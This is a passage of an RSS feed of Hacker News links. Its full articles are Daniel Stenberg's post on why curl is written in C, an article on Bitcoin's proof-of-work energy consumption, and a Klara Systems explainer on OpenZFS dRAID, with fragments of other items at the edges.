<p>With the advanced type features, types can be constructed directly or indirectly based on other existing types. How exactly this is done, will be the subject of this series of posts.</p><p>The posts in the series include:</p><ul><li><a href="https://www.geekabyte.io/2021/01/introduction-to-generics-in-typescript.html">Introduction to Generics in TypeScript</a></li><li><a href="https://www.geekabyte.io/2021/01/generic-constraints-methods-and.html">Generic Constraints and More</a></li><li><a href="https://www.geekabyte.io/2021/01/union-and-intersection-types-in.html">Union and Intersection Types</a></li><li><a href="https://www.geekabyte.io/2021/02/literal-and-template-literal-types.html">Literal and Template Literal Types</a></li><li><a href="https://www.geekabyte.io/2021/02/using-literal-and-template-literal.html">Using Literal and Template Literal Types in TypeScript</a></li><li><a href="https://www.geekabyte.io/2021/02/overview-of-indexable-types-in.html">Overview of Indexable Types in TypeScript</a></li><li>Indexed Access Types and KeyOf - <i>Published soon</i></li><li>Type Queries: Typeof operator - <i>Published soon</i></li><li>Conditional Types - <i>Published soon</i></li><li>Mapped Types - <i>Published soon</i></li></ul>

</div></div>]]>
            </description>
            <link>https://www.geekabyte.io/2021/01/introduction-to-advance-types-in.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26179620</guid>
            <pubDate>Thu, 18 Feb 2021 13:36:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Curl is C (2017)]]>
            </title>
            <description>
<![CDATA[
Score 83 | Comments 79 (<a href="https://news.ycombinator.com/item?id=26179601">thread link</a>) | @taf2
<br/>
February 18, 2021 | https://daniel.haxx.se/blog/2017/03/27/curl-is-c/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2017/03/27/curl-is-c/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>For some reason, this post got picked up again and is <a href="https://news.ycombinator.com/item?id=26179601">debated today</a> in 2021, almost 4 years since I wrote it. Some things have changed in the mean time and I might‚Äôve phrased a few things differently if I had written this today. But still, what‚Äôs here below is what I wrote back then. Enjoy!</p>



<div><figure><a href="https://daniel.haxx.se/blog/wp-content/uploads/2017/01/The_C_Programming_Language_cover.svg_.png"><img loading="lazy" width="348" height="450" src="https://daniel.haxx.se/blog/wp-content/uploads/2017/01/The_C_Programming_Language_cover.svg_-348x450.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2017/01/The_C_Programming_Language_cover.svg_-348x450.png 348w, https://daniel.haxx.se/blog/wp-content/uploads/2017/01/The_C_Programming_Language_cover.svg_-155x200.png 155w, https://daniel.haxx.se/blog/wp-content/uploads/2017/01/The_C_Programming_Language_cover.svg_-768x992.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2017/01/The_C_Programming_Language_cover.svg_.png 792w" sizes="(max-width: 348px) 100vw, 348px"></a></figure></div>



<p>Every once in a while someone suggests to me that curl and libcurl would do better if rewritten in a ‚Äúsafe language‚Äù. Rust is one such alternative language commonly suggested. This happens especially often when we publish new security vulnerabilities. (Update: I think Rust is a fine language! This post and my stance here has nothing to do with what I think about Rust or other languages, safe or not.)</p>



<h2>curl is written in C</h2>



<p>The curl code guidelines mandate that we stick to using C89 for any code to be accepted into the repository. C89 (sometimes also called C90) ‚Äì the oldest possible ANSI C standard. Ancient and conservative.</p>



<h2>C is everywhere</h2>



<p>This fact has made it possible for projects, companies and people to adopt curl into things using basically any known operating system and whatever CPU architecture you can think of (at least if it was 32bit or larger). No other programming language is as widespread and easily available for <em>everything</em>. This has made curl one of the most portable projects out there and is part of the explanation for curl‚Äôs success.</p>



<p>The curl project was also started in the 90s, even long before most of these alternative languages you‚Äôd suggest, existed. Heck, for a truly stable project it wouldn‚Äôt be responsible to go with a language that isn‚Äôt even old enough to start school yet.</p>



<h2>Everyone knows C</h2>



<p>Perhaps not necessarily true anymore, but at least the knowledge of C is very widespread, where as the current existing alternative languages for sure have more narrow audiences or amount of people that master them.</p>



<h2>C is not a safe language</h2>



<p>Does writing safe code in C require more carefulness and more ‚Äútricks‚Äù than writing the same code in a more modern language better designed to be ‚Äúsafe‚Äù ? Yes it does. But we‚Äôve done most of that job already and maintaining that level isn‚Äôt as hard or troublesome.</p>



<p>We keep scanning the curl code regularly with static code analyzers (we maintain a <em>zero <a href="https://scan.coverity.com/projects/curl">Coverity</a> problems</em> policy) and we run the test suite with <a href="http://valgrind.org/">valgrind</a> and <a href="https://en.wikipedia.org/wiki/AddressSanitizer">address sanitizers</a>.</p>



<h2>C is not the primary reason for our past vulnerabilities</h2>



<p>There. The simple fact is that most of our past vulnerabilities happened because of logical mistakes in the code. Logical mistakes that aren‚Äôt really language bound and they would not be fixed simply by changing language.</p>



<p>Of course that leaves a share of problems that could‚Äôve been avoided if we used another language. Buffer overflows, double frees and out of boundary reads etc, but the bulk of our security problems has not happened due to curl being written in C.</p>



<h2>C is not a new dependency</h2>



<p>It is easy for projects to add a dependency on a library that is written in C since that‚Äôs what operating systems and system libraries are written in, still today in 2017. That‚Äôs the default. Everyone can build and install such libraries and they‚Äôre used and people know how they work.</p>



<p>A library in another language will add that language (and compiler, and debugger and whatever dependencies a libcurl written in that language would need) as a new dependency to a large amount of projects that are themselves written in C or C++ today. Those projects would in many cases downright ignore and reject projects written in ‚Äúan alternative language‚Äù.</p>



<h2>curl sits in the boat</h2>



<p>In the curl project we‚Äôre deliberately conservative and we stick to old standards, to remain a viable and reliable library for everyone. Right now and for the foreseeable future. Things that worked in curl 15 years ago still work like that today. The same way. Users can rely on curl. We stick around. We don‚Äôt knee-jerk react to modern trends. We sit still in the boat. We don‚Äôt rock it.</p>



<h2>Rewriting means adding heaps of bugs</h2>



<p>The plain fact, that also isn‚Äôt really about languages but is about plain old software engineering: translating or rewriting curl into a new language will introduce a lot of bugs. Bugs that we don‚Äôt have today.</p>



<p>Not to mention how rewriting would take a huge effort and a lot of time. That energy can instead today be spent on improving curl further.</p>



<h2>What if</h2>



<p><em>If I would start the project today, would I‚Äôve picked another language?</em> Maybe. Maybe not. If memory safety and related issues was the primary concern I had, then sure. But as I‚Äôve mentioned above there are several others concerns too so it would really depend on my priorities.</p>



<h2>Finally</h2>



<p>At the end of the day the question that remains is: would we gain more than we would pay, and over which time frame? Who would gain and who would lose?</p>



<p>I‚Äôm sure that there will be or it may even already exist, curl and libcurl competitors and potent alternatives written in most of these new alternative languages. Some of them are absolutely really good and will get used and reach fame and glory. Some of them will be crap. Just like software always work. Let a thousand curl competitors bloom!</p>



<p>Will curl be rewritten at some point in the future? I won‚Äôt rule it out, but I find it unlikely. I find it even more unlikely that it will happen in the short term or within the next few years.</p>



<p>Discuss this post on <a href="https://news.ycombinator.com/item?id=13966241">Hacker news</a> or <a href="https://www.reddit.com/r/programming/comments/61rh9j/curl_is_c/">Reddit</a>!</p>



<p><strong>Followup-post: </strong><a href="https://daniel.haxx.se/blog/2017/03/30/yes-c-is-unsafe-but/">Yes, C is unsafe, but‚Ä¶</a></p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2017/03/27/curl-is-c/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26179601</guid>
            <pubDate>Thu, 18 Feb 2021 13:34:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Proof of work: the reason behind Bitcoin‚Äôs horrendous energy consumption]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26179585">thread link</a>) | @throw0101a
<br/>
February 18, 2021 | https://amycastor.com/2021/02/17/proof-of-work-the-reason-behind-bitcoins-horrendous-energy-consumption/ | <a href="https://web.archive.org/web/*/https://amycastor.com/2021/02/17/proof-of-work-the-reason-behind-bitcoins-horrendous-energy-consumption/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-6038">
		<div>
		
<p>Any company that supports bitcoin is making one thing clear: they don‚Äôt care about the environment. At a time when global warming is a real threat to the planet, bitcoin is one of the worst offenders.&nbsp;</p>



<p>The global network of computers that ‚Äúmine‚Äù bitcoin consumes an entire country‚Äôs worth of energy in their race to win the next block on the blockchain‚Äîand get the 6.25 bitcoin block reward, currently worth $300,000.&nbsp;</p>



<p>Since PayPal, Square, MicroStrategy, and <a href="https://amycastor.com/2021/02/08/tesla-spent-1-5b-in-clean-car-credits-on-bitcoin-the-filthiest-asset-imaginable/" target="_blank" rel="noreferrer noopener">Tesla</a> got onto the game‚Äîand started shilling bitcoin on social media‚Äîthe price of bitcoin has soared to new heights. And the higher the bitcoin price, the greater the lure for people to invest in warehouses full of power-hungry rigs to mine bitcoin for profit. </p>



<p>Digiconomist‚Äôs <a href="https://digiconomist.net/bitcoin-energy-consumption" target="_blank" rel="noreferrer noopener">Bitcoin Energy Consumption Index,</a> run by Alex de Vries, a blockchain specialist at Big Four accounting firm PwC, estimates bitcoin‚Äôs energy consumption to be 79 terawatt-hours of electricity per year, on par with the entire country of Chile. Per his index, bitcoin also emits 37 megatons of carbon dioxide per year, comparable to that of New Zealand.&nbsp;&nbsp;</p>



<p>Researchers at the University of Cambridge Judge Business School figure bitcoin‚Äôs power consumption to be even higher. According to their <a href="https://cbeci.org/" target="_blank" rel="noreferrer noopener">Cambridge Bitcoin Electricity Consumption Index,</a> bitcoin consumes 124 terawatt-hours of electricity a year, bringing it inline with countries like Argentina and Norway.</p>



<p>In October, just before PayPal announced it would allow users to buy and sell bitcoin via their digital wallets, bitcoin‚Äôs power consumption was 75 terawatt-hours per year, according to the CBECI. Since then, bitcoin‚Äôs price climbed from $10,000 to upwards of $50,000, increasing its energy consumption by 40 percent the process.</p>



<p>In 2018, all of the world‚Äôs data centers consumed <a href="https://science.sciencemag.org/content/367/6481/984" target="_blank" rel="noreferrer noopener">205 terawatt-hours of electricity,</a> or 1% of all of the world‚Äôs electricity. Bitcoin accounts for half of that. </p>



<p>Can the world‚Äôs power grids tolerate this added demand for electricity in the midst of global warming? In the U.S., we are already seeing the impact of extreme weather on our power grids‚Äîmillions in Texas <a href="https://www.nbcnews.com/news/weather/millions-texans-left-shivering-arctic-cold-without-power-n1257959" target="_blank" rel="noreferrer noopener">shivering in cold, dark homes</a> this week. And <a href="https://www.politico.com/states/california/story/2020/08/18/california-has-first-rolling-blackouts-in-19-years-and-everyone-faces-blame-1309757" target="_blank" rel="noreferrer noopener">rolling black outs in California</a> last year. In Iran last month, authorities blamed <a href="https://www.washingtonpost.com/world/2021/01/16/massive-blackouts-have-hit-iran-government-is-blaming-bitcoin/" target="_blank" rel="noreferrer noopener">massive blackouts on bitcoin mining.</a>  </p>



<h2><strong>Coal powered&nbsp;&nbsp;</strong></h2>



<p>And bitcoin‚Äôs energy consumption isn‚Äôt green either‚Äîthough bitcoiners like to say that it is. Bitcoin miners are tuned to profits. That means the fastest rigs and the cheapest energy available, mostly in the form of fossil fuels.&nbsp;</p>



<p>‚ÄúCoal is fueling bitcoin,‚Äù Christian Stoll, an energy researcher at the Technical University of Munich, told <a href="https://www.wired.com/story/bitcoins-climate-impact-global-cures-local/?mbid=social_twitter&amp;mbid=social_twitter&amp;utm_brand=wired&amp;utm_brand=wired&amp;utm_campaign=wired&amp;utm_campaign=wired&amp;utm_medium=social&amp;utm_medium=social&amp;utm_social-type=owned&amp;utm_social-type=owned&amp;utm_source=twitter&amp;utm_source=twitter" target="_blank" rel="noreferrer noopener">Wired magazine</a> a few years ago.&nbsp;&nbsp;</p>



<p>In <a href="https://www.cell.com/joule/fulltext/S2542-4351(19)30255-7" target="_blank" rel="noreferrer noopener">a paper published in <em>Joule</em></a> in June 2019, Stoll and his researchers examined bitcoin mining based on where miners are located and the types of rigs they use. Two-thirds of all bitcoin mining is centered in China, 17% is in Europe, and 15% in North America, the researchers found.&nbsp;</p>



<p>In China, bitcoin‚Äôs mining is spread throughout the country‚Äôs sprawling western provinces, Sichuan and Yunnan, and also in the north, in Xinjiang and Mongolia. In the Sichuan province, where about 58% of the world‚Äôs bitcoin mining takes place, miners take advantage of cheap hydroelectric power‚Äîbut only during the rainy season, which lasts about six months.&nbsp;</p>



<p>Bitcoin is a 24/7 business, however, and when green energy isn‚Äôt available‚Äîand the price of bitcoin is high enough to reap a profit in the dry season‚Äîthe miners in Sichuan turn to coal, the country‚Äôs most abundant energy source. <a href="https://www.iea.org/data-and-statistics?country=CHINA&amp;fuel=Energy%20supply&amp;indicator=ElecGenByFuel" target="_blank" rel="noreferrer noopener">Sixty-five percent of China‚Äôs electricity comes from coal.</a>&nbsp;Bitcoin miners in the Xinjiang province and inner Mongolia also rely heavily on coal-fired electricity.&nbsp;</p>



<p>Even when bitcoin uses clean energy, that pushes the use of dirty energy elsewhere. A few years ago, HyperBlock, a bitcoin mine in Missoula County, Montana, struck a deal with a nearby dam for cheap renewable power. They thought they were doing it right, until county officials noted that if energy from the dam went to bitcoin mining, the county as a whole would end up using more coal. </p>



<p>That was the end of that. <a href="https://www.wired.com/story/montana-county-crimp-bitcoin-save-the-earth/" target="_blank" rel="noreferrer noopener">In April 2019,</a> Missoula required all future mines to purchase or build their own renewable power. And soon after the price of bitcoin crashed in March 2020‚Äîslipping down to below $5,000‚ÄîHyperBlock <a href="https://missoulian.com/news/local/bonner-bitcoin-company-ceases-operations/article_789d8594-f17c-5809-a8fe-918ad226266e.html" target="_blank" rel="noreferrer noopener">declared bankruptcy</a> because it could not pay its power bills.</p>



<h2><strong>Bitcoin mining and proof of work</strong></h2>



<p>Why is bitcoin so inefficient? It turns out that the system uses copious amounts energy not by accident but by design. </p>



<p>Satoshi Nakomoto, bitcoin‚Äôs pseudonymous creator, had to figure out a way to solve the <a href="https://en.wikipedia.org/wiki/Double-spending" target="_blank" rel="noreferrer noopener">double-spend problem.</a> We don‚Äôt have this problem with paper money. But with digital money, someone could copy the file and use it to spend the funds over and over, rendering the currency useless.&nbsp;</p>



<p>In a centralized system, a trusted third-party, like a bank, checks the digital money you spend against a central ledger to make sure there‚Äôs no funny business going on. But bitcoin‚Äôs ledger (the blockchain) is decentralized, which makes the double-spend problem harder to solve.&nbsp;&nbsp;</p>



<p>The solution Satoshi came up with was a clever hack that involves bitcoin mining and proof-of-work. In bitcoin, mining is the process of adding new transactions to the blockchain, and proof-of-work secures the network so transactions can‚Äôt be reversed. You would need more than half of all the computing power on the bitcoin network to double-spend a bitcoin.&nbsp;</p>



<p>It wasn‚Äôt a perfect solution, but Satoshi solved what computer scientists had long thought was unsolvable: how to build a decentralized payment system. The irony is, unless you are collecting payments for <a href="https://news.bitcoin.com/ransomware-ryuk-rakes-in-150-million-in-bitcoin/" target="_blank" rel="noreferrer noopener">ransomware,</a> bitcoin has proven <a href="https://www.wsj.com/articles/why-bitcoin-hasnt-gained-traction-as-a-form-of-payment-11612886974" target="_blank" rel="noreferrer noopener">unusable as a payment system.</a> No merchant wants to risk their profit margin on bitcoin‚Äôs volatility. </p>



<p>Today, bitcoin functions mainly as a <a href="https://www.coindesk.com/store-of-value-remains-cryptos-best-use-case" target="_blank" rel="noreferrer noopener">speculative investment,</a> getting scooped up by retailers and venture capitalists‚Äîand now big companies and <a href="https://cointelegraph.com/news/pension-funds-are-getting-in-on-bitcoin-according-to-grayscalehttps://www.hedgeweek.com/2021/01/19/294600/bitcoins-inefficiencies-are-creating-arbitrage-trades-crypto-hedge-funds" target="_blank" rel="noreferrer noopener">hedge funds</a>‚Äîin the hopes the price will go ever skyward.  &nbsp;</p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">$250k by end of 2022. Just 5X from here. Looking a lot more likely than when I made the initial prediction three years ago, eh? <a href="https://twitter.com/hashtag/Bitcoin?src=hash&amp;ref_src=twsrc%5Etfw">#Bitcoin</a></p>‚Äî Tim Draper (@TimDraper) <a href="https://twitter.com/TimDraper/status/1362131856544702469?ref_src=twsrc%5Etfw">February 17, 2021</a></blockquote></div>
</div></figure>



<h2>Winning the lottery</h2>



<p>Bitcoin miners have their eyes feasted on the bitcoin block reward. </p>



<p>Every 10 minutes, the bitcoin network adds a new block to the blockchain, minting 900 new bitcoins a day in the process. That block reward is reduced by half every four years. Prior to May 2020, the bitcoin block reward was 12.5 bitcoins‚Äîdouble what it is now‚Äîand the network produced 1,800 new bitcoins per day. And around February 2024,* the block reward will be 3.125 bitcoins. </p>



<p>When you request a transaction on the bitcoin blockchain, your transaction goes into the <a rel="noreferrer noopener" href="https://www.blockchain.com/charts/mempool-size" target="_blank">bitcoin mempool,</a> a waiting area for unconfirmed bitcoin transactions. Miners select transactions from the pool‚Äîusually the ones with the highest transaction fees‚Äîand package those into a block ready to process as the next block in the blockchain. </p>



<p>Any server can produce a ‚Äúcandidate block,‚Äù but if it were too easy to do, the network would be spammed. So there had to be a financial cost to creating a block, hence the work.&nbsp;</p>



<p>In the case of bitcoin, that work involves solving a hash puzzle; the cost is computing time and electricity. The hash puzzle is very difficult to solve, but easy for peers in the bitcoin network to verify, so they can prove you did the work and the block is valid.</p>



<p>Some people refer to this puzzle as a complex math problem, but it‚Äôs really not. Working out a hash is easy, but in bitcoin, working out a hash that meets certain conditions is tricky. Finding the solution is a bit like winning a lottery.</p>



<h2>Solving the hash puzzle</h2>



<p>A <a href="https://en.wikipedia.org/wiki/Cryptographic_hash_function" target="_blank" rel="noreferrer noopener">hash</a> is a fixed-length output calculated from a piece of data. Whether you hash Herman Wouk‚Äôs ‚ÄúWar and Remembrance‚Äù or a grocery store list, the resultant hash will always be the same length. And you will always get the same hash for the same string. But if even one letter changes in ‚ÄúWar and Remembrance,‚Äù the resultant hash will be different.</p>



<p>Bitcoin uses the <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Hashcash" target="_blank">hashcash proof-of-work,</a> originally developed by cryptographer Adam Back in 1997 as a way to prevent email spam and denial-of-service attacks, and the <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/SHA-2" target="_blank">SHA-256</a> hashing function, which has been around since 2001.</p>



<p>When you hash a bitcoin block, you also track the hash of the previous block‚Äîwhich ‚Äúchains‚Äù a block to the one before it, and so on down the line to the first bitcoin block ever created‚Äîand a random number called a <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Cryptographic_nonce" target="_blank">nonce.</a> The idea is to produce a hash that is lower than the numeric value of the <a href="https://en.bitcoin.it/wiki/Target" target="_blank" rel="noreferrer noopener">network target.</a> (This target changes periodically to adjust the mining difficulty, thereby assuring only one block gets created every 10 minutes.) </p>



<p>When you mine bitcoin, you repeatedly hash the block while incrementing the nonce. Each time you change the nonce, you also change the value of the resultant hash. The number of hashes that a miner makes per second is called the hash rate; the higher your hash rate, the better your chance of solving the puzzle. A single bitcoin mining rig can make up to 14 trillion guesses per second.</p>



<p>If you discover a hash value that is small enough before anyone else does, you win! Your block is then transmitted to the rest of the network, and the other nodes begin work on the next block using the hash of the accepted block.&nbsp;</p>



<h2>Powerful computers</h2>



<p>As bitcoin went up in value over the years, miners found faster and faster ways to win the bitcoin lottery. When bitcoin was first introduced in 2009, you could mine bitcoin with the CPU on your own personal computer.</p>



<p>Those days are a distant memory. As bitcoin mining became more profitable, miners switched to graphic processing units (GPUs). And in 2011, they migrated to field-programmable gate arrays (FPGAs). But starting in 2013, the field was taken over by application-specific integrated circuit equipment (ASIC) rigs‚Äîwhich is ‚Ä¶</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://amycastor.com/2021/02/17/proof-of-work-the-reason-behind-bitcoins-horrendous-energy-consumption/">https://amycastor.com/2021/02/17/proof-of-work-the-reason-behind-bitcoins-horrendous-energy-consumption/</a></em></p>]]>
            </description>
            <link>https://amycastor.com/2021/02/17/proof-of-work-the-reason-behind-bitcoins-horrendous-energy-consumption/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26179585</guid>
            <pubDate>Thu, 18 Feb 2021 13:32:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[OpenZFS ‚Äì dRAID, Finally]]>
            </title>
            <description>
<![CDATA[
Score 165 | Comments 47 (<a href="https://news.ycombinator.com/item?id=26179566">thread link</a>) | @throw0101a
<br/>
February 18, 2021 | https://klarasystems.com/articles/openzfs-draid-finally/ | <a href="https://web.archive.org/web/*/https://klarasystems.com/articles/openzfs-draid-finally/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>




<div>
<h3><em>This is part of our article series published as ‚ÄúOpenZFS in Depth‚Äù. <a href="https://klarasystems.com/articles/"><strong><span>Subscribe to our article series</span></strong> </a>to find out more about the secrets of OpenZFS</em></h3>



<hr>



<p><strong><em>Isaac Huang‚Äôs <a href="https://www.youtube.com/watch?v=xPU3rIHyCTs">talk at the OpenZFS 2017 developers summit</a> witnessed the expansion of the ZFS storage endurance envelope for large installations.&nbsp; dRAID or distributed RAID is a new vdev type that complements existing ZFS data protection capabilities for very large storage arrays.&nbsp; Starting with the RAID-Z-like underpinnings, dRAID permutes, or mixes, disk blocks together in a way where accesses are evenly spread across all the drives. Fast spindle replacement is accomplished by using all members of the pool, using pre-allocated virtual spares, spread evenly over all the spindles. Contributors include Intel, Lawrence Livermore Labs, and HP Enterprise, which have material interest in storage at datacenter scale and high reliability. The OpenZFS user community are the benefactors of this enhancement if we apply it well.</em></strong></p>



<h3><strong>Avoiding the Death Spiral</strong></h3>



<p>Admins will often use wide RAID stripes to maximize usable storage given a number of spindles. RAID-Z deployments with large stripe widths, ten or larger, are subject to poor resilver performance for a number of reasons. Resilvering a full vdev means reading from every healthy disk and continuously writing to the new spare. This will saturate the replacement disk with writes while scattering seeks over the rest of the vdev. For 14 wide RAID-Z2 vdevs using 12TB spindles, rebuilds can take weeks. Resilver I/O activity is deprioritized when the system has not been idle for a minimum period. Full zpools get fragmented and require additional I/O‚Äôs to recalculate data during reslivering. A pool can degenerate into a never ending cycle of rebuilds or loss of the pool Aka: the Death Spiral.</p>



<p>As spindles age together, disks may fail in groups as defect counts and mechanical failure are not independent random processes with respect to age. SSD‚Äôs further complicate this math as the wear leveling endurance will be very closely matched and clusters of devices under identical load may fail together.&nbsp; Manufacturer provided mean time to failure is a forward-looking statement and is not suitable for replenishment planning. One manufacturer claims 1.2 Million hour MTBF: a dubious 137 year commitment to quality. It‚Äôs poor planning to assume any drive isn‚Äôt going to pick today to dramatically fail.&nbsp;</p>



<p>dRAID is an option providing rapid parity rebuild that can mitigate the death spiral behaviour of wide RAIDZ stripes, but as reflected in its default width setting of eight, it does not encourage wide stripes. Dedicating sufficient parity increases the durability of the ZFS pool and the investment in parity should be informed by the risk of losing the pool.</p>



<h3><strong>Distributed Spares?</strong></h3>



<p>Spare disks are a way of keeping a disk warm and ready to replace a failed member. Usually, a spare‚Äôs life is leisurely idle until they are scrammed into action during a rebuild. That idleness is a wasted opportunity to do useful work. There are no specific spare disks in a dRAID. Rather, enough blocks are allocated throughout out the vdev to act as spares. The distributed spare is a clever redistribution of work so that all disks are always in use. A disk failure precipitates a rebuild into that dedicated space. After replacement disks are available, the vdev can be re-balanced to return the spare block and put the replacement disk in to use.</p>



<h3><strong><strong><strong>Fixed Stripe Width</strong></strong></strong></h3>



<p>Unlike RAID-Z, an entire stripe in dRAID is allocated at once, no matter how many disk blocks are needed to store the object. The stripe width is determined by the disk sector size multiplied by the number of data drives in the RAID group.</p>



<div data-columns="3" data-layout="50-25-25"><div>




<div><div>
<p>Did you know?</p>



<h2>You can maximize the <strong>power of your FreeBSD</strong> infrastructure with our <strong>Support Subscription!</strong></h2>




</div></div>




</div></div>



<p>RAID-Z has a method of optimizing block layout to minimize block allocations for small files. dRAID however priorities the speed of rebuilding parity and does not make the same space preserving attempt. If your files are a small fraction of the stripe size, dRAID will not be able to use all the disk blocks fully. For example, a default dRAID vdev has a stripe with of 32k (4k per disk, 8 disks); any allocation will require at least 32k. Internal padding is allocated to fill out the stripe width after the request object is stored. Using a smaller stripe width or providing a special mirror vdev will suit smaller allocations and improve drive utilization.</p>



<h3><strong>A Tale of Two Resilvers</strong></h3>



<p>After a failure, the real or distributed spare is written to in sequence, following only the parity layout in the space map to rebuild the drive according to parity data. Sequential reconstruction can be accomplished rapidly by issuing large I/O blocks, reducing seeks, and avoiding tree indirection overhead. The rebuilt disk‚Äôs contents are not necessarily consistent with the Merkle tree that proves the zpools data is intact.&nbsp; It‚Äôs important to reconstruct this bitwise copy of the disk first, allowing the system to return to mostly intact state and return to service. That is to say, the sequential reconstruction process restores the redundancy level of the pool, but without being able to verify the checksums of the data. The advantage to this is that it can be completed much more quickly, reducing the window during which additional disk failures might put the pool at risk.</p>



<p>A healing resilver is triggered automatically after a sequential resilver, it is a final operation that verifies that all the contents of the drives match their initial checksums via block pointer traversal. The healing resilver has a number of optimizations to quickly find and reconstruct writes to the failed disk. When a replacement drive can be added to the pool, the rebalance operation is another sequential resilver followed by a healing resilver.</p>



<p>A scrub is the gold standard for a pool health; however, a scrub might be a prohibitive amount of work, visiting every block allocated in the pool. The healing resilver allows a practical return to operation in an environment where failures must be repaired routinely.</p>



<h3><strong><em>‚ÄúAre We There Yet? When Can I Play With it?‚Äù</em></strong></h3>



<p>According to a report from the January OpenZFS leadership meeting, OpenZFS 2.1 will support dRAID in early 2021. If you must have it now; the head branch of the OpenZFS build against recently supported operating systems: FreeBSD 12.1+, Linux 5.10+, Illumos, NetBSD et al. The OpenZFS regression test suite ztest is a good indication that dRAID satisfies the ZFS commitment to data protection. Corporate customers at IBM and Panasas have been flogging other distributed RAID systems for more than ten years. It‚Äôs a mature concept that complements the ZFS tool set.</p>



<h4><strong>Quick Start</strong></h4>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; There is no better way to learn software than to run headlong into mistakes.&nbsp;</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; We‚Äôll install ZFS head from source and gin up some ‚Äòmd‚Äô file backed disks.</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ‚Äòzpool create r2dRAID dRAID2:3d:1s:14c /dev/md1 /dev/md2 ‚Ä¶.&nbsp; /dev/md13 /dev/md14‚Äô</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; There it is, a zpool with a dRAID vdev, ready to go to work.</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The OpenZFS wiki has a good description of <a href="https://openzfs.github.io/openzfs-docs/Basic%20Concepts/dRAID%20Howto.html">dRAID care, resilvering and rebalancing</a></p>



<p>Following the life cycle of failure and replacement in the documentation is recommended before those skills are tested in production.</p>



<h4><strong>dRAID Nomenclature</strong></h4>



<p>Let‚Äôs decode the nomenclature that describes the geometry of a dRAID vdev. A string such as ‚ÄúdRAID2:3d:14c:1s‚Äù encodes the following about a dRAID vdev.</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -dRAID[&lt;parity&gt;][:&lt;data&gt;d][:&lt;children&gt;c][:&lt;spares&gt;s]</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -parity: Required, the number of spindles to use to store parity information. Eg: A dRAID3 can survive until a fourth disk failure without losing data. Parity may be 1,2 or 3.</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -[d] data: (spindles per RAID group): Determines the width of the data stripe, 8 is the default. Larger values will increase the stripe width and reduce total parity.</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -[c] children: This parameter should match the number of device entries that you feed to the vdev. A helpful check will warn you if you don‚Äôt get the right number of disks named correctly: ‚Äúinvalid number of dRAID children; 14 required but 13 provided‚Äù</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -[s] spares: The number of disk areas to mix in as distributed spares. No spares are created by default, a maximum of four are welcome. Each spare will remove a fraction of space from every disk.</p>



<h2><strong>Parting Short</strong></h2>



<p>The dRAID offers a solution for large arrays, vdevs with fewer than 20 spindles will have limited benefits from the new option. The performance and resilver result will be similar to RAIDZ for small numbers of spindles. Installations with many spindles will see the best results with regards to performance, fast spare activation and replacement. The benefits come with the associated cost of whole stripe at a time allocation for small objects in the pool. This overhead should be calculated in the design of the pool before it‚Äôs an operational surprise.</p>



<p>There is no free lunch with dRAID for in saving parity or spare drives, they are your defense against data loss. As drives increase in size, their time to resilver increases and the amount of data they can destroy increases.</p>



<h2><strong>Like this article? Share it!</strong></h2>


</div>




</div></div>]]>
            </description>
            <link>https://klarasystems.com/articles/openzfs-draid-finally/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26179566</guid>
            <pubDate>Thu, 18 Feb 2021 13:31:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Clubhouse Goes Global]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26179391">thread link</a>) | @donohoe
<br/>
February 18, 2021 | https://restofworld.org/2021/four-countries-one-clubhouse/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2021/four-countries-one-clubhouse/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			<!-- Article Start -->
			
<p><span>W</span>hat happens when a buzzy app pegged as a digital soapbox for tech bros suddenly lands on the global stage?</p>



